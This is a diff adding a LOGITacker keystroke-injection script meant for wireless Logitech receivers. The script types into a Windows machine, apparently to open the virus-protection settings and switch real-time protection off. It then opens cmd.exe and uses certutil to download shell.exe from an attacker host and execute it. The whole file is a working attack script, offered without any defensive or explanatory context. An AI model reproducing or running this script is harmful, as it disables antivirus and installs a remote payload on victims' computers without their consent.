@@ -1,0 +1,34 @@
+
+
+LOGITacker (injection) $ script show
+script start
+0001: press GUI
+0002: delay 500
+0003: string Virus
+0004: delay 200
+0005: press RETURN
+0006: delay 1500
+0007: press TAB
+0008: press TAB
+0009: press TAB
+0010: press RETURN
+0011: delay 500
+0012: press SPACE
+0013: delay 1500
+0014: press TAB
+0015: delay 200
+0016: press TAB
+0017: delay 200
+0018: press RETURN
+0019: delay 300
+0020: press ALT F4
+0021: delay 500
+0022: press GUI
+0023: delay 500
+0024: string cmd.exe
+0025: press RETURN
+0026: delay 1500
+0027: string certutil.exe -urlcache -split -f http://<ATTACKER IP>/shell.exe shell.exe & shell.exe
+0028: delay 1000
+0029: press ALT F4
+script end
